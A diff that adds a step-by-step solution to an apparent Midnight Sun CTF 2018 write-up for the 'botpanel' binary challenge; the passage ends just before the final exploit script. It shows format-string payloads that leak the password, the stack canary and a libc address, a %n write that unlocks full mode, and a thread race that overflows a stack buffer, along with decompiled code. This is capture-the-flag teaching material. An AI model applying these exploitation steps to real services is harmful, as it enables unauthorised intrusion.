@@ -8,7 +8,7 @@ header:
 tags:
   - midnightsun2018
   - writeup
-  - web
+  - pwn
 ---
 
 Multiple vulnerabilties involving formats strings and unsafe threaded access to
@@ -26,6 +26,8 @@ standard buffer overflow.
 ```
 These cyber criminals are selling shells like hot cakes off thier new site. Pwn
 their botpanel for us so we can stop them
+
+Service: nc pwn.midnightsunctf.se 31337 | nc 52.30.206.11 31337
 ```
 
 #### Points
@@ -37,6 +39,231 @@ Solves: 19
 Author: likvidera
 
 ## Solution
+
+First, there is a format string bug in the login:
+
+```shell
+		Panel password: %x.%x.%x.%x.%x
+		Incorrect! 4 attempts left
+		Your attempt was: 4.b.565560c0.5655b008.
+		Panel password: 		Incorrect! 3 attempts left
+		Your attempt was: 3
+b.565560c0.5655b008.
+		Panel password:
+```
+
+We can leverage this to leak the password from the server:
+
+```shell
+		Panel password: %7$s
+		Incorrect! 4 attempts left
+		Your attempt was: >@!ADMIN!@<
+		Panel password:
+```
+
+Furthermore, we can get the return address from main in libc with `%43$x` and
+the stack canary with `%15$x`.
+
+```shell
+                Incorrect! 2 attempts left
+%               Your attempt was: f75ea637
+                Panel password: 15$x
+                Incorrect! 1 attempts left
+                Your attempt was: 22f5e800
+                Panel password:
+```
+
+If we log in, we'd notice that the application is set to trial mode. This means
+that we can't use the invite feature.
+
+```shell
+MENU [TRIAL MODE]
+ 1) Show available bots
+ 2) Send invite
+ 3) Send feedback
+ 4) Quit
+>
+```
+
+The trial mode byte is checked and set here in the `login` function:
+
+```c
+  if ( *(_BYTE *)(a2 + 1) == 'T' )
+    trial_mode = 1;
+```
+
+To upgrade us to a full user, we can overwrite that address with anything apart
+from 'T'.
+
+To do this, we will just leverage the format string vulnerability to write
+there.
+
+```shell
+		Panel password: %6$n
+		Incorrect! 4 attempts left
+		Your attempt was:
+		Panel password: >@!ADMIN!@<
+
+MENU [REGISTERED MODE]
+ 1) Show available bots
+ 2) Send invite
+ 3) Send feedback
+ 4) Quit
+>
+```
+
+Now, we can send invites to two listening netcat sessions.
+
+```shell
+MENU [REGISTERED MODE]
+ 1) Show available bots
+ 2) Send invite
+ 3) Send feedback
+ 4) Quit
+> 2
+Send an invite to a friendly blackhat!
+IP:127.0.0.1
+
+Port:1337
+
+MENU [REGISTERED MODE]
+ 1) Show available bots
+ 2) Send invite
+ 3) Send feedback
+ 4) Quit
+> 2
+Send an invite to a friendly blackhat!
+IP:127.0.0.1
+
+Port:1336
+
+MENU [REGISTERED MODE]
+ 1) Show available bots
+ 2) Send invite
+ 3) Send feedback
+ 4) Quit
+>
+```
+
+We will receive a panel like this on the listeners:
+
+```shell
+$ nc -v -l -p 1337
+Listening on [0.0.0.0] (family 0, port 1337)
+Connection from [127.0.0.1] port 1337 [tcp/*] accepted (family 2, sport 60484)
+
+MENU [REGISTERED MODE]
+ 1) Show available bots
+ 2) Send invite
+ 3) Send feedback
+ 4) Quit
+>
+```
+
+There is a bug with handling feedback. This is the code from `send_feedback`:
+
+```c
+unsigned int __cdecl send_feedback(int *a1)
+{
+  int v2; // [esp+14h] [ebp-44h]
+  int v3; // [esp+18h] [ebp-40h]
+  char v4; // [esp+1Ch] [ebp-3Ch]
+  unsigned int v5; // [esp+4Ch] [ebp-Ch]
+
+  v5 = __readgsdword(0x14u);
+  v3 = 0;
+  memset(&v4, 0, 0x30u);
+  v2 = 0;
+  sendstr(*a1, "\nFeedback length: ");
+  len_2800 = get_int(a1);
+  if ( (unsigned int)len_2800 <= 0x32 )
+  {
+    sendstr(*a1, "\nFeedback: ");
+    recv_until(*a1, (int)&v3, len_2800, 10);
+    sendstr(*a1, "\nEdit feedback y/n?: ");
+    recv_until(*a1, (int)&v2, 2, 10);
+    if ( (_BYTE)v2 == 'y' )
+    {
+      sendstr(*a1, "\nFeedback: ");
+      recv_until(*a1, (int)&v3, len_2800, 10);
+    }
+  }
+  else
+  {
+    sendstr(*a1, "\nFeedback length is incorrect!\n");
+  }
+  return __readgsdword(0x14u) ^ v5;
+}
+```
+
+Since each session is running on a thread, they both share certain resources
+and variables such as the variable `len_2800`. This means that if we can
+interleave the order of which instructions get executed between the two
+sessions, we can potentially read as much data into the stack and control the
+instruction pointer. The stack canary will not pose a problem for us since we
+already leaked it with the format string vulnerability.
+
+To perform the next step, we have to send feedback on both sessions. In the
+first session, we specify a legitimate length for the feedback and hold when it
+asks if we want to re-enter it.
+
+```shell
+MENU [REGISTERED MODE]
+ 1) Show available bots
+ 2) Send invite
+ 3) Send feedback
+ 4) Quit
+> 3
+
+Feedback length: 32
+
+Feedback: AAAA
+
+Edit feedback y/n?:
+```
+
+On the other session, we can specify a very large length to read and manipulate
+the `len_2800` variable.
+
+```shell
+MENU [REGISTERED MODE]
+ 1) Show available bots
+ 2) Send invite
+ 3) Send feedback
+ 4) Quit
+> 3
+
+Feedback length: 999
+
+Feedback length is incorrect!
+
+MENU [REGISTERED MODE]
+ 1) Show available bots
+ 2) Send invite
+ 3) Send feedback
+ 4) Quit
+>
+```
+
+Back on the first session, we can now overflow the stack buffer.
+
+```shell
+Edit feedback y/n?: y
+
+Feedback: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+
+The program crashes:
+
+```shell
+MENU [REGISTERED MODE]
+ 1) Show available bots
+ 2) Send invite
+ 3) Send feedback
+ 4) Quit
+> *** stack smashing detected ***: ./botpanel_e0117db42051bbbe6a9c5db571c45588 terminated
+Aborted (core dumped)
+```
 
 The final exploit script:
 
